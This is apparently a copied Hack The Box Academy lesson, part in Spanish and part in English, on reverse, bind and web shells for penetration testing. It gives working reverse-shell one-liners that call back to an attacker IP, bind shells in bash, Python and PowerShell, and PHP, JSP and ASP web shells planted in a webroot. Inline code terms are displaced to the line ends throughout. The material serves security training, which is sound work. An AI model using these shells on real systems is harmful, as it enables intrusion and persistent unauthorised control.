
------

#shell #revshell 

--------------

Una vez que comprometemos un sistema y explotamos una vulnerabilidad para ejecutar comandos en los hosts comprometidos de forma remota, generalmente necesitamos un método de comunicación con el sistema para no tener que seguir explotando la misma vulnerabilidad para ejecutar cada comando. Para enumerar el sistema o tomar un mayor control sobre él o dentro de su red, necesitamos una conexión confiable que nos brinde acceso directo al shell del sistema, es decir, o , para que podamos investigar a fondo el sistema remoto para nuestro próximo movimiento.`Bash``PowerShell`

Una forma de conectarnos a un sistema comprometido es a través de protocolos de red, como para Linux o para Windows, que nos permitirían un inicio de sesión remoto en el sistema comprometido. Sin embargo, a menos que obtengamos un conjunto funcional de credenciales de inicio de sesión, no podríamos utilizar estos métodos sin ejecutar comandos en el sistema remoto primero, para obtener acceso a estos servicios en primer lugar.`SSH``WinRM`

El otro método para acceder a un host comprometido para el control y la ejecución remota de código es a través de shells.  
Como se ha comentado anteriormente, hay tres tipos principales de shells: Reverse Shell, Bind Shell y Web Shell. Cada uno de estos shells tiene un método diferente de comunicación con nosotros para aceptar y ejecutar nuestras órdenes.

|Tipo de concha|Método de comunicación|
|---|---|
|`Reverse Shell`|Se conecta de nuevo a nuestro sistema y nos da el control a través de una conexión inversa.|
|`Bind Shell`|Espera a que nos conectemos a él y nos da el control una vez que lo hacemos.|
|`Web Shell`|Se comunica a través de un servidor web, acepta nuestros comandos a través de parámetros HTTP, los ejecuta e imprime la salida.|

Profundicemos más en cada una de las conchas anteriores y veamos ejemplos de cada una.

---

## Reverse shell

A es el tipo más común de shell, ya que es el método más rápido y fácil para obtener control sobre un host comprometido. Una vez que identificamos una vulnerabilidad en el host remoto que permite la ejecución remota de código, podemos iniciar un oyente en nuestra máquina que escuche en un puerto específico, digamos puerto . Con este listener en su lugar, podemos ejecutar un que conecta el shell de los sistemas remotos, es decir, o a nuestro listener, lo que nos da una conexión inversa a través del sistema remoto.`Reverse Shell``netcat``1234``reverse shell command``Bash``PowerShell``netcat`

#### Oyente de Netcat

El primer paso es iniciar un oyente en un puerto de nuestra elección:`netcat`

  Tipos de conchas

```shell-session
zunderrubb@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
```

Las banderas que estamos utilizando son las siguientes:

|Bandera|Descripción|
|---|---|
|`-l`|Modo de escucha, para esperar a que se conecte una conexión con nosotros.|
|`-v`|Modo detallado, para que sepamos cuándo recibimos una conexión.|
|`-n`|Deshabilite la resolución DNS y solo conéctese desde/hacia IP, para acelerar la conexión.|
|`-p 1234`|El número de puerto está escuchando y se debe enviar la conexión inversa.`netcat`|

Ahora que tenemos un oyente esperando una conexión, podemos ejecutar el comando reverse shell que se conecta a nosotros.`netcat`

#### Volver a conectar IP

Sin embargo, primero, necesitamos encontrar la IP de nuestro sistema para enviarnos una conexión inversa. Podemos encontrar nuestra IP con el siguiente comando:

  Tipos de conchas

```shell-session
zunderrubb@htb[/htb]$ ip a

...SNIP...

3: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
    link/none
    inet 10.10.10.10/23 scope global tun0
...SNIP...
```

In our example, the IP we are interested in is under , which is the same HTB network we connected to through our VPN.`tun0`

Note: We are connecting to the IP in 'tun0' because we can only connect to HackTheBox boxes through the VPN connection, as they do not have internet connection, and therefore cannot connect to us over the internet using `eth0`. In a real pentest, you may be directly connected to the same network, or performing an external penetration test, so you may connect through the `eth0` adapter or similar.

#### Reverse Shell Command

The command we execute depends on what operating system the compromised host runs on, i.e., Linux or Windows, and what applications and commands we can access. The [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) page has a comprehensive list of reverse shell commands we can use that cover a wide range of options depending on our compromised host.

Certain reverse shell commands are more reliable than others and can usually be attempted to get a reverse connection. The below commands are reliable commands we can use to get a reverse connection, for on Linux compromised hosts and on Windows compromised hosts:`bash``Powershell`

Code: bash

```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
```

Code: bash

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

Code: powershell

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

We can utilize the exploit we have over the remote host to execute one of the above commands, i.e., through a Python exploit or a Metasploit module, to get a reverse connection. Once we do, we should receive a connection in our listener:`netcat`

  Types of Shells

```shell-session
zunderrubb@htb[/htb]$ nc -lvnp 1234

listening on [any] 1234 ...
connect to [10.10.10.10] from (UNKNOWN) [10.10.10.1] 41572

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

As we can see, after we received a connection on our listener, we were able to type our command and directly get its output back, right in our machine.`netcat`

A is handy when we want to get a quick, reliable connection to our compromised host. However, a can be very fragile. Once the reverse shell command is stopped, or if we lose our connection for any reason, we would have to use the initial exploit to execute the reverse shell command again to regain our access.`Reverse Shell``Reverse Shell`

---

## Bind Shell

Another type of shell is a . Unlike a that connects to us, we will have to connect to it on the listening port.`Bind Shell``Reverse Shell``targets'`

Once we execute a , it will start listening on a port on the remote host and bind that host's shell, i.e., or , to that port. We have to connect to that port with , and we will get control through a shell on that system.`Bind Shell Command``Bash``PowerShell``netcat`

---

#### Bind Shell Command

Once again, we can utilize [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md) to find a proper command to start our bind shell.

Note: we will start a listening connection on port '1234' on the remote host, with IP '0.0.0.0' so that we can connect to it from anywhere.

The following are reliable commands we can use to start a bind shell:

Code: bash

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

Code: python

```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

Code: powershell

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

---

#### Netcat Connection

Once we execute the bind shell command, we should have a shell waiting for us on the specified port. We can now connect to it.

We can use to connect to that port and get a connection to the shell:`netcat`

  Types of Shells

```shell-session
zunderrubb@htb[/htb]$ nc 10.10.10.1 1234

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

As we can see, we are directly dropped into a bash session and can interact with the target system directly. Unlike a , if we drop our connection to a bind shell for any reason, we can connect back to it and get another connection immediately. However, if the bind shell command is stopped for any reason, or if the remote host is rebooted, we would still lose our access to the remote host and will have to exploit it again to gain access.`Reverse Shell`

---

#### Upgrading TTY

Once we connect to a shell through Netcat, we will notice that we can only type commands or backspace, but we cannot move the text cursor left or right to edit our commands, nor can we go up and down to access the command history. To be able to do that, we will need to upgrade our TTY. This can be achieved by mapping our terminal TTY with the remote TTY.

There are multiple methods to do this. For our purposes, we will use the method. In our shell, we will use the following command to use python to upgrade the type of our shell to a full TTY:`python/stty``netcat`

  Types of Shells

```shell-session
zunderrubb@htb[/htb]$ python -c 'import pty; pty.spawn("/bin/bash")'
```

After we run this command, we will hit to background our shell and get back on our local terminal, and input the following command:`ctrl+z``stty`

  Types of Shells

```shell-session
www-data@remotehost$ ^Z

zunderrubb@htb[/htb]$ stty raw -echo
zunderrubb@htb[/htb]$ fg

[Enter]
[Enter]
www-data@remotehost$
```

Once we hit , it will bring back our shell to the foreground. At this point, the terminal will show a blank line. We can hit again to get back to our shell or input and hit enter to bring it back. At this point, we would have a fully working TTY shell with command history and everything else.`fg``netcat``enter``reset`

We may notice that our shell does not cover the entire terminal. To fix this, we need to figure out a few variables. We can open another terminal window on our system, maximize the windows or use any size we want, and then input the following commands to get our variables:

  Types of Shells

```shell-session
zunderrubb@htb[/htb]$ echo $TERM

xterm-256color
```

  Types of Shells

```shell-session
zunderrubb@htb[/htb]$ stty size

67 318
```

The first command showed us the variable, and the second shows us the values for and , respectively. Now that we have our variables, we can go back to our shell and use the following command to correct them:`TERM``rows``columns``netcat`

  Types of Shells

```shell-session
www-data@remotehost$ export TERM=xterm-256color

www-data@remotehost$ stty rows 67 columns 318
```

Once we do that, we should have a shell that uses the terminal's full features, just like an SSH connection.`netcat`

---

## Web Shell

The final type of shell we have is a . A is typically a web script, i.e., or , that accepts our command through HTTP request parameters such as or request parameters, executes our command, and prints its output back on the web page.`Web Shell``Web Shell``PHP``ASPX``GET``POST`

#### Writing a Web Shell

First of all, we need to write our web shell that would take our command through a request, execute it, and print its output back. A web shell script is typically a one-liner that is very short and can be memorized easily. The following are some common short web shell scripts for common web languages:`GET`

Code: php

```php
<?php system($_REQUEST["cmd"]); ?>
```

Code: jsp

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

Code: asp

```asp
<% eval request("cmd") %>
```

---

#### Uploading a Web Shell

Once we have our web shell, we need to place our web shell script into the remote host's web directory (webroot) to execute the script through the web browser. This can be through a vulnerability in an upload feature, which would allow us to write one of our shells to a file, i.e. and upload it, and then access our uploaded file to execute commands.`shell.php`

However, if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web. So, the first step is to identify where the webroot is. The following are the default webroots for common web servers:

|Web Server|Default Webroot|
|---|---|
|`Apache`|/var/www/html/|
|`Nginx`|/usr/local/nginx/html/|
|`IIS`|c:\inetpub\wwwroot\|
|`XAMPP`|C:\xampp\htdocs\|

We can check these directories to see which webroot is in use and then use to write out our web shell. For example, if we are attacking a Linux host running Apache, we can write a shell with the following command:`echo``PHP`

Code: bash

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

---

#### Acceso a Web Shell

Una vez que escribimos nuestro shell web, podemos acceder a él a través de un navegador o usando . Podemos visitar la página en el sitio web comprometido y usar para ejecutar el comando:`cURL``shell.php``?cmd=id``id`

   

![](https://academy.hackthebox.com/storage/modules/33/write_shell_exec_1.png)

Otra opción es utilizar :`cURL`

  Tipos de conchas

```shell-session
zunderrubb@htb[/htb]$ curl http://SERVER_IP:PORT/shell.php?cmd=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Como podemos ver, podemos seguir cambiando el comando para obtener su salida. Un gran beneficio de un shell web es que evitaría cualquier restricción de firewall en su lugar, ya que no abrirá una nueva conexión en un puerto, sino que se ejecutará en el puerto web en o , o en cualquier puerto que esté utilizando la aplicación web. Otro gran beneficio es que si se reinicia el host comprometido, el shell web seguiría en su lugar, y podemos acceder a él y obtener la ejecución de comandos sin volver a explotar el host remoto.`80``443`

Por otro lado, un shell web no es tan interactivo como los shells reverse y bind, ya que tenemos que seguir solicitando una URL diferente para ejecutar nuestros comandos. Aún así, en casos extremos, es posible codificar un script para automatizar este proceso y darnos un shell web semi-interactivo directamente dentro de nuestra terminal.`Python`